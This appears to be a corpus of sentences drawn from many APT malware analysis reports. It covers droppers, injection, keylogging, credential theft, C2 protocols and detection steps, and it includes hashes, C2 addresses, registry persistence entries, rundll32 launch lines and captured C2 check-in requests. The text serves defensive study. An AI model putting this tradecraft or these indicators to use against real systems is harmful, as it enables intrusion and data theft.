Once injected into the services.exe process , a copy of the main Stuxnet binary and a companion DLL that implements the payload are saved to disk in encrypted form along with a MRXCLS.SYS load point driver .
Stuxnet 0.5 arrives as an infected Step 7 project archive containing both the s7hkimdb.dll and XR000001.MDX files .
ApiLog/Types – modified to trigger DLL loading vulnerability XUTILS/links/S7P00001.DBF – configuration file XUTILS/listen/S7000001.MDX – payload DLL ( installation.dll ) XUTILS/listen/XR000000.MDX – main Stuxnet binary ( outbreak.dll ) hOmSave7/subfolder/s7hkimdb.dll - loader Similar to Stuxnet 1.x versions , Stuxnet 0.5 has limited command-and-control ability .
Both files are loaded by the usbacc11.sys driver and then injected into the svchost.exe and iexplore.exe processes .
When a removable drive is inserted in an infected system , Stuxnet 0.5 will infect any Step 7 project archives with a .s7p
This allows us to draw the following diagram of the C & C infrastructure as of November 2012 : For the Command and Control servers , the various generations of the backdoor connect to different scripts : For instance , the script `` /cgi-bin/nt/th '' is being used to receive commands from the command-and- control server , usually in the form of new plugins to run on the victim 's computer .
The main difference between these categories is their behavior on the infected system : `` Offline '' : exists as files on local disk , capable of creating its own system registry keys , local disk log files , and may communicate with C & C servers on their own .
Each malware sample contains three such domains , which are hardcoded inside the main backdoor component : Step-by-step description ( 2nd stage ) After a connection with the C & C server is established , the backdoor starts the communication process , which leads to the loading of additional modules .
Most `` interesting '' out of those are : A list of the most popular domains used for command and control can be found below : Interestingly , although the domain `` dll-host-update.com '' appears in one of the malware configurations , it had not been registered by the attackers .
This file is essentially a backdoor , which is decoded by the loader module ( svchost.exe ) .
The initial payload in that case was a mail attachment , an exploited PDF file ( readme.pdf , md5 72bdca7dd12ed04b21dfa60c5c2ab6c4 ) which downloaded and decoded an encoded blob ( md5 ec16143a14c091100e7af30de03fce1f ) from the site www.humanright-watch.org , not to be confused with the legitimate Human Rights ' Watch website hrw.org .
The decoded file was a Maudi dropper , self-signed using the name `` soft @ hotmail.com '' , and the dropped component belonged to the `` JinDiQIAO @ hotmail.com '' -signed cluster .
For example , the malware dropper cc1a806d25982acdb35dd196ab8171bc , a WinRAR SFX executable installed through the use of the Word exploit CVE-2012-0158 , contained a PlugX component configured to connect to ppt.bodologetee.com .
o yt.bodologetee.com – domain This domain has been used as Command & Control domain for a number of samples .
The Command & Control servers used are in many cases organized through well-known dynamic DNS providers such as 3322.org , zapto.org and so on , but there are also a few seemingly directly registered second level domains .
The malware is a '' root kit '' that hides the presence of the spying operation and also creates a hidden , encrypted file system to store stolen data and tools used by the attackers , he said .
Chien said that in some cases when a command and control server was taken offline , Turla 's operators have quickly pushed out new versions of the malware that directed infected computers to new command and control servers .
Hackers use Turla to establish a hidden foothold in infected networks from which they can search other computers , store stolen information , then transmit data back to their servers .
They have used dozens of different '' command and control '' servers located in countries around the world to control infected systems , according to Symantec , whose researchers have helped identify and shut down some of those systems .
The operators can download specialized tools onto an infected system , adding any functionality they want by including it in the encrypted file system , Blasco said .
MD5 acbc249061a6a2fb09271a68d53567d9 and 90a37e54c53ffb78969644b1a7038e8c are both Trojan.APT.9002 variants and connect to a command and control server at 58.64.143.244 .
This Trojan.APT.9002 variant connected to a command and control server at 111.68.9.93 over port 443 .
The data in the POST stub is also encrypted with a 4-byte XOR key , and when decrypted , the data is similar to the data in the non-HTTP beacon and also has the static value `` \x09\x12\x11\x20″ .
This variant connected to a command and control server at ad04.bounceme.net .
It uses a non-HTTP protocol as well as an HTTP POST for communicating with the remote server .
By default , this backdoor injects itself into the svchost.exe or winlogon.exe process .
Some of C & C servers that we have seen from our accumulated data are as follows : To start its connection to its C & C server , the backdoor component will first send 5-bytes ( \x01\x00\x00\x00\x33 ) .
To add stealth to its backdoor routines , it uses a legitimate process context 's memory space to inject the main backdoor .
The backdoor then replies with a beacon message , the contents of which are as follows : Either backdoor identifier 1 or backdoor identifier 2 acts as the campaign code or marker for EvilGrab campaigns , which is recognizable by the C & C server and/or attacker .
It then collects autocomplete entries from the following registry key : It then initiates a brute force attack on encrypted credentials using the CryptUnprotectData API .
'' Of all the samples we 've tied to this activity so far noted in this blog , this is the only one configured to connect directly to an IP address for Command and Control ( C2 ) .
We do n't have enough data to say for certain that all of the malware in this blog was delivered via compromised legitimate websites .
Historically , Nitro is known for targeted spear phishing campaigns and using Poison Ivy malware , which was not seen in these attacks .
In most instances , the malware is one commonly referred to as '' Spindest , '' though we also found `` PCClient '' and `` Farfli '' variants in use by the group .
The filename matches that of the sample in Table 5 , which had a very similar third level C2 domain and the same IP resolution .
The different ways it collects information from the infected machine are as follows : yy Keylogger yy Taking screenshots yy Stealing data from clipboard yy Stealing files yy Stealing PKI certificates and associated private keys yy Stealing usernames and passwords from browsers , instant messengers and email clients yy Stealing WLAN passwords yy Stealing Windows password hashes The information collected by the malware is automatically uploaded to remote servers via FTP .
Once launched , the file drops the malware onto the system ( such files are therefore referred to as droppers in the rest of this documents ) .
The data collection components include a keylogger , clipboard stealer , screenshotter , and password stealers for a variety of popular chat , email and web browsing programs .
Key logging is skipped if one of the following AV process is running on the system : Cosmu takes screenshots periodically and sends them to the attacker , together with other stolen data .
DROPPER : DECOYS CosmicDuke dropper files all display some kind of a decoy document or image to distract the user when the attack file is launched .
The following is the summary of potential detection steps : • Check if there is only one GET parameter • ( check if path is not empty and contains index.php ) ( possible , but not confirmed ) • convert the Base64-like GET parameter string into real Base64 encoding , and check if it decodes correctly • check if the decoded string has at least two delimieter character `` | '' in it • check if after the last but first `` | '' character , there are digits only • check if the version part of the string follows the format `` 1.11 '' or similar The header sent is fairly standard , but we include one example nonetheless : The used Agent strings vary significantly across queries , therefore they can not be really used for detection : The Google search step also uses different agent strings : The C & C server 's response – if it sends encrypted files – is a GIF file containing a small icon , and after that , the malware : For stage 3 ( i.e. , < id > .gif
Address and open port information is below : Basic detection can be based on 3 queries that are initiated by the victim computers within seconds .
For example , we recovered the following two files : md5sum base.cat :113e6fc85317fdd135e3f5f19e6c7a58 *base.cat md5sum ~6rld.tmp : c786a4cdfe08dbe7c64972a14669c4d1 *~6rld.tmp where base.cat is the startup file , which is created based on ~6lrd.tmp .
base.cat is stored in the `` All users '' directory , whereas ~6lrd.tmp is stored in a user 's directory , e.g. , in the guest user directory as `` C : \Documents and Settings\guest\Local Settings\Application Data\~6rld.tmp '' This user directory contains at least one more file , update.cmd with a specific content that could be used for detection .
`` C : \WINDOWS\system32\rundll32.exe '' C : \DOCUME~1\ALLUSE~1\APPLIC~1\base.cat , JorNgoq The running process of the malware can be pinpointed , e.g. , by using ProcessExplorer .
The server executable is responsible for installing the 9002 payload malware , and has its configuration block stored in its .data
When the threat actor builds a malware executable , the builder writes the server executable to disk and overwrites the configuration block with the newly configured options .
Nullsoft is a script-driven tool that simplifies the installation routines of executable files onto the Microsoft Windows operating system .
As an experiment , we used NSIS v2.34 to create our own simple installer and found that the XML in the manifest had no new-line or tab characters .
The builder contains a copy of the server executable in its PE resource section , under BIN .
Going back to the malware process tree we can see that Binder launches the following command , which is instructing Windows utility rundll32.exe to load Sayad Client DiagnosticsService.dll , obtain the function address of the native API named `` 78121 '' via GetProcAddress ( ) , and call the function pointer of the entry point `` 78121 '' .
The stolen data being uploaded to the malicious server is encrypted first using a RSA public key which is stored in the malware configuration file .
There are several interesting aspects of Sayad malware , and after running the malicious executable through the Vinsula Execution Engine to analyze its behavior , I discovered that the initial executable titled WEXTRACT.exe ( SHA1:1c52b749403d3f229636f07b0040eb17beba28e4 ) was in fact a self extracting EXE that dropped and launched the Binder executable malware , ~8f60957b3689075fa093b047242c0255.exe ( SHA1:69fd05ca3a7514ea79480d1dbb358fab391e738d ) .
Sayad Client DLL 's main entry point initializes and starts up all data collection methods that the assembly implements .
The Binder ensures that the malware will survive reboots by registering the command for loading and executing the Client DLL ( DiagnosticsService.dll ) to run at startup as shown below .
The module transmits the collected information in the body of the POST request and gets new commands from the server 's response .
If failed , tries to write to the file f : \keyhook.log Each time the keylogger starts , it appends the following header to the log file : -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- New Session : % fully qualified computer name % % timestamp % -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- It then creates a hidden console window and registers its only export _LowLevelKeyboardProc @ 12 as a hook procedure for low-level keyboard input events ( WH_KEYBOARD_LL hook ) .
The module uses Wininet API functions for issuing HTTP POST requests to the server .
It collects most of the available information about the system , transmits it to the C & C server and executes the commands it receives back .
This indicates the backdoor can also function as a plugin for the Turla Carbon system .
The sample analyzed carried a Web browser password recovery tool originating from http : //securityxploded.com/browser-password-decryptor.php • The RunExeCmdSingle component is a DLL file that drops and executes another executable .
The following are examples of a POST request and a POST response : POST request example : POST /wp08/wp-includes/dtcla.php ? id=285745296322896178920098FD80-20 & v1=038 & v2=17 0393861 & q=5265882854508EFCF958F979E4 HTTP/1.1 User-Agent : Mozilla/5.0 ( Windows ; U ; Windows NT 6.1 ; en-US ) AppleWebKit/525.19 ( KHTML , like Gecko ) Chrome/1.0.154.36 Safari/525.19 Host : toons.freesexycomics.com Content-Length : 0 Cache-Control : no-cache POST response example : HTTP/1.1 200 OK Date : Wed , 22 Jan 2014 13:40:48 GMT Content-Type : text/html Transfer-Encoding : chunked Connection : keep-alive Server : Apache/1.3.37 ( Unix ) Cache-Control : no-cache 9f65 < html > < head > < mega http-equiv='CACHE-CONTROL ' content='NO-CACHE ' > < / head > < body > No data ! < ! -- havexQlpoOTFBWSZTWWYvDI0BOsD//////////////////////////////////// /////////4oB+93VVXu69DuN7XYzds9yt49Ques [ ...
identifiant=51032 _ 175129256364 Example POST request for C & C server check-in POST /check _ value.php HTTP/1.1 User-Agent : Mozilla/4.0 ( compatible ; MSIE 7.0 ; Windows NT 6.1 ; .NET
Trojan.Karagany ! gen1 may create the following additional files in the installation folder : • Form.api • inact.api • prog.cer • Cent.api • ie.pdb It then creates a C : \ProgramData\Mail\MailAg\gl directory as a temporary directory used for uploading files .
The earliest method was an email spear phishing campaign , which saw selected executives and senior employees in target companies receive emails containing a malicious PDF attachment .
- % TEMP % \AdobeARM.exe - % TEMP % \iTunesHelper.exe - % PROGRAMS % \Startup\AdobeRe.exe - rouj.exe - % USERPROFILE % \Local Settings\iexplore.exe - % USERAPPDATA % \Microsoft\wuauclt.exe - % PROGRAMS % \Startup\adobeup.exe - % TEMP % \AdobeUpdater.exe - NTLMSVC.DLL - % PROGRAMS % \Startup\adobe_sl.lnk - % TEMP % \runinfo.exe Product : SoundMAX service agent Description : Microsoft NTLM Service Holder Product & Description : JpgAsp System based indications of possible compromise by the comment crew attackers .
This document details the following types of indictors : - Network - File - System - Email The contents of this document are indicators only and may match legitimate services or applications .
File based indications of possible compromise by the comment crew attackers .
Network based indications of possible compromise by the comment crew attackers .
Email based indications of possible compromise by the comment crew attackers .
System persistence is obtained via a modification in the `` Software\Microsoft\Windows\ CurrentVersion\Run '' registry key and by adding a copy of the malware to the Startup folder .
This is used to save all keystrokes and system activity to another file in the same location , `` Trojan.exe.tmp '' .
When executed , the original sample created another executable file in the Windows ' temporary folder ( C : \Users\ [ USERNAME ] \AppData\Local\Temp ) named `` Trojan.exe '' , which corresponds to the code of the RAT itself .
The real log file was one where all keystrokes were recorded and later sent from the computer via a TCP connection .
The first button ( ‫فيش عام شامل‬ , General Global File ) uses `` data-base.db.exe '' ( MD5 8f16efb51fe67961e e31c4f36cbe11db ) , which was placed into `` C : \Users\User\AppData\Roaming '' and , when executed , extracts the Excel spreadsheet file `` Data-Base.xslx '' ( MD5 f0a8a1556efbb106b6297700d4cce61b ) from the `` Data-Base.db '' ( MD5 95a5c3e91bbb4a3a323433841fbef82a ) file in the main folder .
files containing a key to secure communications between the compromised computer and the attacker 's machine .
Delivery Vector We believe that the Molerats attacker uses spear phishing to deliver weaponized RAR files containing their malicious payloads to their victims in at least two different ways .
Attacks Guide for CIOs , CFOs , and Enter Poison Ivy CISOs on why traditional security defenses are failing We observed several attacks in June and July 2013 against targets in the Middle East and the U.S. that dropped a and how losing the security PIVY payload that connected to command-­and-­control ( CnC ) infrastructure used by the Molerats attackers .
We also believe that this actor sends spear-­phishing emails that include links to RAR files hosted on third-­party platforms such as Dropbox .
The popular remote access tool ( RAT ) , which we recently detailed on this blog , is being used in a broad campaign of attacks launched from the Middle East , too .
Taking a deeper look at the decrypted malicious code , this malware was found to contain at least the following functions : Download file Download and execute or load library Change sleep duration Open and close interactive sessions Malware is increasingly becoming more contextually advanced .
As depicted in the diagram below , the spear phishing document ( which exploits CVE-2012-0158 ) creates a decoy document and a malware dropper named exp1ore.exe .
This malware was analysed to be a backdoor that allows the attacker to remote control the infected system .
Of these , one of the spear phishing documents was suspected to have used a potentially stolen document as a decoy .
The shellcode has a decryption stub which decrypts its body using the XOR key 0x9E , and this shellcode is used to extract exp1ore.exe ( malware ) and Wor.doc ( benign document ) .
Command and Control : During this stage the infected host system establishes a communications channel to a command and control ( C & C ) server operated by the at- tackers .
Once this channel has been established the at- tackers can issue commands and download further mal- ware on to the system Additional attacker actions : After a successful com- promise is established , attackers can conduct a number of actions including ex-ﬁltrating data from the infected host and transmitting it back to attackers through a process of encrypting , compressing , and transferring to a server 2 operated by the attackers .
The infected host may also serve as a starting point to infect other machines on the network and seek out speciﬁc information or credentials .
Second , having participants forward us e-mails does not allow us to verify if the targeted organi- zation was successfully compromised by the attack ( e.g. , if another member of the organization open and executed malware on their machine ) and what the scope of the at- tack was .
Compromise : During this stage malicious code is exe- cuted on a target machine typically after a user initiated action such as opening a malicious document or link .
The pages used for phishing typically used obfuscated code to redirect the user to another webpage : In some pages the malicious redirect was disabled by the attackers , by placing additional JavaScript on the page which would redirect users to a legitimate site preferentially .
Organisations with good logging for their e-mail data could attempt to detect activity relating to compromised accounts by alerting on `` impossible journeys '' , where locations from which users log in are monitored and where alerts are produced when a single user logs in from two separate countries in a short period of time .
Sample 5e3bea788e89e0814e898b4a648b93c0b74f7e2c Decoy documents are used in conjunction with malware droppers in order to make the target believe the file they have just opened is legitimate .
For example the screenshot below shows the contents of a credential phishing website designed to mimic the legitimate OWA site of a defence contractor .
The usage of malware in targeted attacks to steal information of value to attackers has been widely reported , however the simple technique of phishing for credentials , whilst still relatively common in targeted attacks , is still more typically associated with criminal attackers involved in day to day cyber-fraud .
As a result , it is difficult for a malicious third-party to install an untrusted application , such as a remote access Trojan ( RAT ) , onto a system that is adequately protected with the Bit9 platform .
The attackers bundled this Intel driver application with variants of Backdoor.Moudoor using a popular Chinese archiving application called Haozip .
The attackers installed Backdoor.Hikit , a Trojan that provides extremely stealthy remote access to compromised systems .
The other Trojans that share these traits are : • Backdoor.Vasport • Backdoor.Boda File creation template % TEMP % \uid.ax % % TEMP % % \ % s.ax % % TEMP % % \ % s _ p.ax Command and control template POST http : // % ls : % d/ % x HTTP/1.1 Content-Length : 2 CONNECT % ls : % d HTTP/1.1 Connection : keep-alive lynx There is also evidence that Backdoor.Vasport and Trojan .
These attackers pioneered the watering-hole technique , however they can also fall back to more traditional methods of attack , such as spear-phishing emails , supply chain attacks and Trojanized software updates .
Actually : and to obtain Di ( the original data that gives us Ei once encrypted ) , we must perform the following operation : where master_key is `` OrcaKiller '' for the OrcaRat sample .
The feature does the same in OrcaRat : check for some date and time written in a file , and sleep for as long as needed before deleting the aforementioned file .
But when we look at a more recent sample of LeoUncia , we have one with the above string and two other interesting strings : `` \r\nThe Remote Shell Execute : % s completed ! \r\n '' `` \r\nReturnTime Set Error ! \r\n '' `` \r\nReturnTime set success ! \r\n '' These two strings are linked to the writing in the hibernation file , and indicates to the C & C manager that its command either succeeded or failed .
In both case , the first goal of the customization is to avoid the presence of some `` / '' in any encoded data , because it would break down the process of cutting the URI along with the `` / '' separator .
PWC explain it pretty well : the URI is made of some sort of Base64-encoded strings with the middle one being the seed to be associated to the master key to decrypt the whole thing .
The RIPTIDE exploit document drops its executable file into the C : \Documents and Settings\ { user } \Application Data\Location folder while the HIGHTIDE exploit document drops its executable file into the C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\ folder .
From October 2012 to May 2014 , FireEye observed APT12 utilizing RIPTIDE , a proxy-aware backdoor that communicates via HTTP to a hard-coded command and control ( C2 ) server .
The backdoor had the following properties : The backdoor connects to a command and control server at icc [ .
This malicious Word document had an MD5 of 499bec15ac83f2c8998f03917b63652e and dropped a backdoor to C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\word.exe .
Similar to RIPTIDE and HIGHTIDE , the WATERSPOUT backdoor is an HTTP-based backdoor that communicates with its C2 server .
cmd.exe /Q is executed in the module XPlugTelnet in order to start a telnet server on the attacked machine .
XPlugRegedit implements a set of commands to process the Windows registry .
Sample B , when executed , attempts to load a ﬁle McUtil.DLL from the same directory , which usually is another component of McAfee .
In a next step , svchost.exe is instructed to execute the original msiexec.exe from Microsoft , where also memory is injected like it has been done for svchost.exe .
The entropy of this ﬁle is 7.997904 bits per byte : The code , when executed , reveals the ﬁrst hint about what we found : It decompresses and decrypts itself , using the Microsoft API call RtlDecompressBuﬀer and the custom decryption routine : The decrypted and decompressed ﬁle is not written onto disk , it always remains in memory .
The function create_from_resources ( ) looks like : Subsequently , after dropping the correct ﬁles , the malware makes itself persistent on the system and creates a service with the following parameters , which loads the ﬁle usbdev.sys as a kernel driver : If during installation anything goes wrong , the registry keys are deleted .
In this module , the following transport or communication modules are present : Type 1 : tcp , b2m Type 2 : np , frag , m2b This corresponds to the transports found in Sample D. The compiled code of bzip2/libbzip2 , a program and library for lossless block-sorting data compression , was identiﬁed , coming from http : //svn.apache.org/repos/asf/labs/axmake/trunk/src/libuc++/srclib/bzip2/compress.c .
Sample A can be considered an installer or dropper .
Right after it creates directories on the VFS : CreateDirectoryA ( `` \\\\.\\IdeDrive1\\\\Tasks\\ '' , ( LPSECURITY_ATTRIBUTES ) & Dst ) ; CreateDirectoryA ( `` \\\\.\\IdeDrive1\\\\Results\\ '' , ( LPSECURITY_ATTRIBUTES ) & Dst ) ; Sample D is the next ﬁle in the logical execution order , as it creates the following mutexes , which are also accessed by Sample E. Sample D can be considered the main userland module , a control unit that sets up the communication with the kernel module and has the ability to load plugins dynamically during runtime .
Global\411A5195CD73A8a710E4BB16842FA42C is used to exclusively access temporary ﬁles Global\MSDBG.Global.MUTEX.ATF is used to exclusively access \.\IdeDrive1\log.txt Global\WindowsShellHWDetection is used to exclusively access \.\IdeDrive1\Results\result.txt Global\MSCTF.Shared.MUTEX.RPM is used to exclusively access \.\IdeDrive1\Tasks\task.txt Global\881F0621AC59C4c035A5DC92158AB85E is used to exclusively access \.\IdeDrive1\Tasks \task_system.txt During the startup of the ModuleStart ( ) function , 6 threads are being started .
The backdoor install file and batch file are copied by network sharing , and the batch file is executed with the work scheduler .
The attacker uses various Reloading Point techniques in order to maintain the connection between the installed back door and the C & C server .
From then on , the attacker uses the same method and installs many back doors in the server network .
The executed back door then broadcasts connection status with the C & C server using the proxy feature , and the attacker approaches the corresponding system based on the broadcast information .
The attacker uses various kinds of anti-forensic techniques in order to avoid being disconnected with the C & C server once the back door is discovered .
Quickly considering these results in cursory questions reflected as follows : • Command and Control ( C2 ) appears to be accomplished via providing commands in an encrypted file stored on the local 'master ' system ( re : netsat.exe ) .
Based on available analysis results , netsat.exe could collect surreptitiously gathered data from any infected drive connected to the system whereon netsat.exe was running , e.g. , the infected drive would not have to be processed by the same system whereon it became infected .
The following table illustrates the hard coded dates in relation to the affected files ' PE dates : The following version information was recorded in the netsat.exe executable : The Language/Code Page code 1033 denotes U.S. English .
Essentially , netsat.exe appeared to operate as a master program that infected removable media connected to the system whereon it was running and collected data from infected drives when the drives returned .
The presence of the following files may indicate netsat.exe , et al , involvement : The presence of the following , specifically on removable media , may indicate netsat.exe , et al , involvement : Cursory analysis did not disclose entrenchment data , such as a Registry entry to ensure persistence .
Usually in such cases an attacker will use their access to place an exploit kit on the compromised website , delivering malware to visitors - a technique commonly referred to as setting up a 'watering hole ' or 'strategic web compromise ' .
ScanBox is particularly dangerous as it does n't require malware to be successfully deployed to disk in order to steal information - the keylogging functionality simply requires the JavaScript code to be executed by a web browser .
] com selectively loaded extra plugins from separate files : Figure 1 – The JavaScript function to load additional plugins We can see how these differ by comparing two exploit kits side by side : Figure 2 – foundationssl [ .
The framework also facilitates reconnaissance , enabling attackers to exploit vulnerabilities in visitors systems in a more traditional fashion , by pushing & executing malware .
qoog1e.com on the right loads JavaScript from separate files A motivation for selectively loading plugins is likely to be to prevent crashes or any errors appearing ( which may alert the compromised site 's owner ) when the page is loaded – as some of the plugins are only compatible with specific browsers .
Dropped to % PROFILE % \Application Data\Erease.vbe , that connects to the C & C server .
The document starts with the RTF header stuff , followed by the encrypted second stage .
The first , from Plugx , reads the length of the embedded decoy document and Win32 payload from the end of the file , and using this info locates and decrypts the appended payload .
Additionally , it has some internal function names not seen in earlier Plugx versions : ZX , ZXWT , JP1 , JP2 , JP3 , JP4 , JP5 , JAP0 , JAP1 Dropped to C : \Documents and Settings\All Users\DRM\KavSky\m.exe ( clean loader , digitally signed by Kaspersky ) and C : \Documents and Settings\All Users\DRM\KavSky\msi.dll ( malware loader ) and C : \Documents and Settings\All Users\DRM\KavSky\msi.dll.eng ( payload ) ; registered in for startup as a service in HKLM\SYSTEM\CurrentControlSet\Services\KavSky → ImagePath The payload is next generation Plugx , plugin function creation dates are 20140719 decimal .
Dropped to C : \Documents and Settings\All Users\DRM\AShld\AShld.exe ( clean loader , digitally signed by McAfee ) and C : \Documents and Settings\All Users\DRM\AShld\AShldRes.DLL ( malware loader ) and C : \Documents and Settings\All Users\DRM\AShld\AShldRes.DLL.asr ( payload ) ; registered for startup as a service in HKLM\SYSTEM\CurrentControlSet\Services\ AShld → ImagePath The payload is next generation Plugx , plugin function creation dates are 0x20130810 .
During lateral movement in a victim 's network , the attackers deploy a module to actively scan the local area network , find hosts vulnerable for MS08-067 ( the vulnerability exploited by Conficker ) or accessible with admin credentials from its own password database .
Notably , one of the commands in the Trojan dropper switches the codepage of an infected machine to 1251 before installation .
These tasks are provided as PE EXE files and are installed in the infected machine .
The C & C infrastructure is actually a chain of servers working as proxies and hiding the location of the true -mothership- command and control server .
The campaign , identified as `` Rocra '' , short for `` Red October '' , is currently still active with data being sent to multiple command-and-control servers , through a configuration which rivals in complexity the infrastructure of the Flame malware .
The sun.css file was a malicious executable with an MD5 of bd07926c72739bb7121cec8a2863ad87 and it communicated with the same communications protocol described above to the same command and control server at 180.150.228.102 .
One of these Hitkit samples connected to a command and control server at downloadmp3server [ .
We pivoted off the command and control IP addresses used by these samples and found the following known malicious domains recently pointed to 180.150.228.102 .
This callback traffic is HTTP over port 443 ( which is typically used for HTTPS encrypted traffic ; however , the traffic is not HTTPS nor SSL encrypted ) .
Upon execution , 8aba4b5184072f2a50cbc5ecfe326701 writes `` 28542CC0.dll '' ( MD5 : 46fd936bada07819f61ec3790cb08e19 ) to this location : C : \Documents and Settings\All Users\Application Data\28542CC0.dll In order to maintain persistence , the original malware adds this registry key : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\28542CC0 The registry key has this value : rundll32.exe `` C : \Documents and Settings\All Users\Application Data\28542CC0.dll '' , Launch The malware ( 8aba4b5184072f2a50cbc5ecfe326701 ) then connects to a host in South Korea ( 180.150.228.102 ) .
C & C Server : 29f2aad01fee3663.com McAfee has coverage for this exploit CVE-2011-3544 and detects the downloaded payload used in the targeted attack as BackDoor-FJJ .
This file , when opened , exploits one of the above mentioned vulnerabilities and drops the payload file `` msmx21.exe '' .
The following registry entry would enable the Trojan to execute every time when Windows starts .
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon `` Userinit '' '' C : \WINDOWS\system32\userinit.exe , '' '' C : \WINDOWS\system32\userinit.exe , C : \Program Files \WindowsNT\svchost.exe '' HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Zeemav : `` '' C : \Documents and Settings\Home\Application Data\Keucot\qagi.exe '' '' Users are requested to exercise caution while opening unsolicited emails and unknown links .
msmx21.exe creates and executes the following files : % Temp % \msc.bat % ProgramFiles % \Windows NT\svchost.exe % ProgramFiles % \Windows NT\wsdktr.ltp ( Encrypted payload ) - > random name The dropped batch file has the following content : The use of `` chcp 1251 '' in the batch file is to switch the codepage of an infected system to handle Cyrillic characters .
Figure 9 : Malicious Dialogue that Prompts for User 's Credentials Figure 10 : POST Request Containing User 's Credentials Sent to C2 Networking and Infrastructure After the user enters data into the username and password fields , the data is transmitted to the C2 server via a POST request ( Figure 10 ) .
What Can Network Defenders Do ? The relative simplicity of FIN4 's tactics ( spearphishing , theft of valid credentials , lack of any malware installed on victim machines ) makes their intrusion activity difficult to detect .
We have also observed this group send emails with links to fake Outlook Web App ( OWA ) login pages that will also steal the user 's credentials , however we have not observed this tactic in recent months .
These campaign codes are transmitted to FIN4's command and control ( C2 ) servers along with stolen credentials .
FIN4 appears to be heavily reliant on Tor ( software that enables users to browse the Internet anonymously by encrypting their internet traffic and routing it through servers around the world ) and has been seen using Tor to login to victims' email accounts after obtaining the compromised user credentials .
All of these files were infected with the known Trojan Virus Havex Rat .
The corrupted eCatcherSetup.exe contained a malware which could , under restricted conditions , compromise the Talk2M login of the infected user .
The most recent company known to have their software infected with the Havex backdoor was the German company MB Connect Line GmbH , who are known for their industrial router mbNET and VPN service mbCONNECT24 .
The files mbCHECK ( Europe ) , VCOM_LAN2 and mbCONFTOOL have been replaced with infected files .
A corrupted eCatcherSetup.exe file had been uploaded into the CMS ( Content Management System ) of www.ewon.biz web site .
Once executed it drops and launches a batch script in a % Temp % subfolder with the following content : As you can see , it enforces some configuration in the registry in order to hide file extensions and not show hidden folders .
After some quick initialization , the backdoor XORs an embedded string with 0x9D to extract the IP address of the C & C server .
Subsequently the malware creates and launches a Cabinet Self-Extractor , which drops two additional executable files : one embedding either a PDF or a Microsoft Office Word document , the other being the actual backdoor .
The main backdoor installed and executed on the victims ' systems appears to be a custom reverse shell with just a handful of features .
In order to get some fun out of an overall straightforward analysis , I quickly hacked together a Python script that emulates a ByeBye backdoor - following is the code : As you can see , this script simply tries to emulate the basic functionality of ByeBye : it performs the initial check-in and waits for incoming messages from the operator .
( Source : Dell SecureWorks ) Capabilities The Comfoo RAT has the following features : System/network information gathering Keystroke logging Screenshots File upload/download/execute Command shell By studying the network traffic of infected systems , CTU researchers determined that the server side of the Comfoo malware sends an HTTP server header identifying the server version as `` Apache 2.0.50 ( Unix ) '' .
Network detection A typical Comfoo HTTP phone-home request looks like the following : GET /CWoNaJLBo/VTNeWw11212/12664/12VTNfNmM1aQ/UTWOqVQ132/ HTTP/1.1Accept : image/gif , image/x-xbitmap , image/jpeg , image/pjpeg , */*Accept-Language : en-enUser-Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Windows NT 5.1 ) Host : smtp.dynami‐ clink.ddns.usConnection : Keep-AliveCache-Control : no-cache An active C2 server responds with headers similar to the following : HTTP/1.1 200 OKDate : Mon , 29 Jul 2013 19:26:15 GMTServer : Apache/2.0.50 ( Unix ) Content-Length : 10Keep-Alive : timeout=15 , max=90 Disk/memory/registry detection The unique string T1Y943jIhk can be found in the Comfoo binary .
One of the universal aspects of APT attacks is the use of malicious software tools that grant unauthorized backdoor access to computer systems inside the targeted network .
Instead , the master console program connects to the relay server on-demand , and any incoming victim data is passed to the master console connection .
This port accepts connections from victims' systems to send data to and receive commands from the Comfoo administrator encapsu- lated in HTTP requests and responses .
ZxShell employs a strange method for communication : it hooks the NtWriteFile API and recognizes 5 different special handle values as commands : 0x111111111 -- Hide `` Loveusd '' driver from the system kernel driver list 0x22222222 -- Securely delete an in-use or no-access target file-name 0x44444444 -- Unhook the ZwWriteFile API and hook KiFastCallEntry 0x55555555 -- Remove the ZxShell Image Load Notify routine 0x88888888 -- Set a special value called `` type '' in Windows registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverMain The second Loveusd system thread does a lot of things .
The analysts involved were able to identify command and control ( C2 ) servers , dropper and installation methods , means of persistence , and identify the attack tools that are core to the RAT 's purpose .
Further , the keylogging and remote desktop functionality allows the operator to spy on the infected machine , observing all keystrokes and viewing all user actions .
The ZxShell service is installed as usual , and the in-execution dropper is deleted permanently using the special handle value 0x22222222 for the WriteFile API call .
Each Svchost group can contain one or more service names that are extracted from the following registry key , whose Parameters key contains a ServiceDLL value : HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Service On a Windows machine , the netsvc group contains names of both existing and non-existing services .
In the aforementioned university-related incidents , a legitimate executable named MediaSoft.exe ( MD5 hash : d00b3169f45e74bb22a1cd684341b14a ) loaded a file named msi.dll ( MD5 hash : ae6f33f6cdc25dc4bda24b2bccff79fe ) , which , in turn , was used to load the Sakula executable ( MD5 hash : 0c2674c3a97c53082187d930efb645c2 ) .
This final executable was also signed with a certificate assigned to an organization called DTOPTOOLZ Co. , Ltd. Command-and-Control ( C2 ) communications in this incident went directly to IP address 180.210.206.246 ; a sample GET request is below : Further investigation revealed similar activity stretching back to at least April 2014 , when similar TTPs were used to target a healthcare organization and a U.S.-based IT company with high-profile clients in the defense sector .
The downloaded plugin file included a variant of Sakula malware .
When this file was executed , it caused the victim to view a website by using the ShellExecute ( ) API to open a URL .
They display progress bars that make it appear as if the specified software is being updated or installed .
Surtr connects to a command and control server ( C2 ) and downloads a stage two component to % ALL USERS % /Application Data/Microsoft/Windows/Burn/_ [ VICTIM COMPUTER NAME ] .log
Surtr 's capabilities include listing of file directories and contents on the victim computer and any USB drives connected to a victim machine , viewing web cache , executing remote commands and logging keystrokes .
